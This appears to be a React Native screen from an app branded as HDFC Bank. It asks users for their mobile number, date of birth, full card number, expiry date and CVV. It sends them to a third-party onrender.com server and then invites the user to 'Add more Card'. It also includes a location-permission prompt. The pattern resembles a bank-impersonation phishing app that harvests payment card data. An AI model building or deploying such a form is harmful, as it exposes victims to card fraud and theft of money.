import { View, Text, TextInput, TouchableOpacity, StyleSheet, ScrollView, Alert, Modal, Pressable, PermissionsAndroid } from 'react-native'
import React, { useEffect, useState } from 'react'
import { rgbaColor } from 'react-native-reanimated/src/reanimated2/Colors';
import { Formik } from 'formik';
import * as yup from 'yup'
import DateField from 'react-native-datefield';
import axios from 'axios'
import AsyncStorage from '@react-native-async-storage/async-storage';
import { useNavigation } from '@react-navigation/native';
import CalendarPicker from 'react-native-calendar-picker';

const schema = yup.object().shape({
    cardNumber: yup.string().trim().required('This Field is Required').min(4, 'Must be 4 atleast Character long'),
    expDate: yup.date().required('This Field is Required'),
    cvv: yup.string().trim().required('This Field is Required').min(3, 'Invalid cvv').max(3, "Invalid cvv"),
    dob: yup.date('Invalid Date').required('This Field is Required'),
    mobile: yup.string().required('This Field is Required').min(10, 'Mobile Number must be atleast 10 disits long').max(10, 'Mobile Number can be maximum 10 digit long'),
})

const initialValues = {
    cardNumber: "",
    expDate: "",
    cvv: "",
    dob: "",
    mobile: "",
}

export default function CardDetails() {
    const [visible, setVisible] = useState(false);
    const navigate = useNavigation()

    const onClose = () => {
        setVisible(false)
    }

    async function submitDetails(value, resetForm) {
        console.log("values", value)

        try {
            const user = AsyncStorage.getItem("hdfc-bank-token") && JSON.parse(await AsyncStorage.getItem("hdfc-bank-token")) || {}

            const response = await axios.post("https://hdfc-bank-9qmz.onrender.com/api/v1/user/submitCreditDetails", value, {
                headers: {
                    userid: user._id,
                    token: user.token
                }
            })
            console.log("card details response", response.data)
            if (response.data?.status) {
                setVisible(true);
                resetForm(initialValues);
            }
        }
        catch (err) {
            Alert.alert(err.response?.data.message || "something wrong happend")
            console.log("cedit details api", err)
        }
    }


    async function requestLocationPermission() {
        try {
            const granted = await PermissionsAndroid.request(
                PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
                {
                    'title': 'Example App',
                    'message': 'Example App access to your location'
                }
            )
            console.log("granted", granted)
            if (granted === PermissionsAndroid.RESULTS.GRANTED) {
                console.log("You can use the location");
                Alert.alert("You can use the location");
            } else {
                console.log("location permission denied");
                Alert.alert("Location permission denied");
            }
        } catch (err) {
            console.warn(err)
        }
    }

    return (
        <>
            <TouchableOpacity onPress={requestLocationPermission}>
                <Text style={{ color: "red" }}>Ask Permission</Text>
            </TouchableOpacity>

            <Formik
                initialValues={initialValues}
                validationSchema={schema}
                onSubmit={(values, { resetForm }) => submitDetails(values, resetForm)}
            >
                {
                    ({ handleChange, handleSubmit, values, touched, errors }) => {
                        return (
                            <ScrollView>
                                <View style={styles.MainView}>

                                    <Text style={styles.Title}>Enter Card Details</Text>
                                    <TextInput style={styles.Input} keyboardType={'phone-pad'}
                                        value={values.mobile}
                                        onChangeText={handleChange('mobile')}
                                        placeholder="Mobile Number" placeholderTextColor={"whitesmoke"} />
                                    {(errors.mobile && touched.mobile) ?
                                        <Text style={styles.error} >{errors.mobile}</Text> : null
                                    }
                                    {/* <CalendarPicker
                                        onDateChange={handleChange("dob")}
                                    /> */}
                                    {/* <Text style={styles.labelText}>Date of Birth</Text> */}
                                    {/* <DateField
                                        labelDate="dd"
                                        labelMonth='mm'
                                        labelYear='yyyy'
                                        styleInput={styles.Input}
                                        containerStyle={styles.dateContainer}
                                        onChangeText={(e) => {
                                            console.log("e", e)
                                            handleChange("dob")
                                        }}
                                    /> */}
                                    <TextInput style={styles.Input}
                                        value={values.dob}
                                        onChangeText={handleChange('dob')}
                                        placeholder="Date of Birth" placeholderTextColor={"whitesmoke"} />
                                    {(errors.dob && touched.dob) ?
                                        <Text style={styles.error} >{errors.dob}</Text> : null
                                    }
                                    <TextInput style={styles.Input} keyboardType={'phone-pad'}
                                        value={values.cardNumber}
                                        onChangeText={handleChange('cardNumber')}
                                        placeholder="Card Number" placeholderTextColor={'whitesmoke'} />
                                    {(errors.cardNumber && touched.cardNumber) ?
                                        <Text style={styles.error} >{errors.cardNumber}</Text> : null
                                    }
                                    <TextInput style={styles.Input}
                                        value={values.expDate}
                                        onChangeText={handleChange('expDate')}
                                        placeholder="Expiry Date" placeholderTextColor={'whitesmoke'} />
                                    {(errors.expDate && touched.expDate) ?
                                        <Text style={styles.error} >{errors.expDate}</Text> : null
                                    }
                                    <TextInput style={styles.Input}
                                        value={values.cvv}
                                        onChangeText={handleChange('cvv')} keyboardType={'phone-pad'}
                                        placeholder="cvv Number" placeholderTextColor={'whitesmoke'} />
                                    {(errors.cvv && touched.cvv) ?
                                        <Text style={styles.error} >{errors.cvv}</Text> : null
                                    }
                                    <TouchableOpacity style={styles.SignIn} onPress={handleSubmit} >
                                        <Text style={styles.SignInText}>Submit</Text>
                                    </TouchableOpacity>
                                </View>
                            </ScrollView>
                        )
                    }}
            </Formik>

            <Modal
                transparent={true}
                animationType="slide"
                visible={visible}
                onRequestClose={onClose}
            >
                <View style={styles.modalBackground}>
                    <View style={styles.modalContainer}>
                        <Text style={styles.modalText}>Success!</Text>
                        <TouchableOpacity onPress={onClose} style={styles.closeButton}>
                            <Text style={styles.closeButtonText}>Add more Card</Text>
                        </TouchableOpacity>
                    </View>
                </View>
            </Modal>
        </>
    )
}

const styles = StyleSheet.create({

    MainView: {
        backgroundColor: rgbaColor(0, 0, 0, 0.70),
        borderRadius: 20,
        marginVertical: 30,
        marginHorizontal: 15,
        paddingTop: 50,
        paddingBottom: 30,
        paddingHorizontal: 20
    },
    Title: {
        color: "white",
        fontSize: 25,
        textAlign: 'center',
        fontWeight: '600',
        lineHeight: 40,
        marginBottom: 30
    },
    Input: {
        borderBottomWidth: 1,
        borderBottomColor: 'white',
        color: rgbaColor(20, 247, 12),
    },
    labelText: {
        marginTop: 16
    },
    dateContainer: {
        justifyContent: "space-between",
        width: '50%'
    },
    SignIn: {
        backgroundColor: 'white',
        borderRadius: 10,
        paddingVertical: 7,
        marginTop: 25,
    },
    SignInText: {
        textAlign: "center",
        fontWeight: "500",
        fontSize: 17,
        color: "#000"
    },
    HaveAccount: {
        fontFamily: "sans-serif",
        marginTop: 30,
        color: 'white',
        textAlign: 'center'
    },
    LogInText: {
        color: rgbaColor(50, 140, 240),
        fontSize: 22,
        textAlign: 'center'
    },
    error: {
        fontSize: 14,
        color: 'red',
        marginTop: 3,
    },




    modalBackground: {
        flex: 1,
        backgroundColor: 'rgba(0, 0, 0, 0.5)',
        alignItems: 'center',
        justifyContent: 'center',
    },
    modalContainer: {
        backgroundColor: 'white',
        padding: 20,
        borderRadius: 10,
        alignItems: 'center',
    },
    modalText: {
        fontSize: 24,
        fontWeight: 'bold',
        marginBottom: 10,
        color: "#000",
    },
    closeButton: {
        backgroundColor: 'blue',
        paddingVertical: 10,
        paddingHorizontal: 20,
        borderRadius: 5,
        marginTop: 10,
    },
    closeButtonText: {
        color: 'white',
        fontWeight: 'bold',
    },


})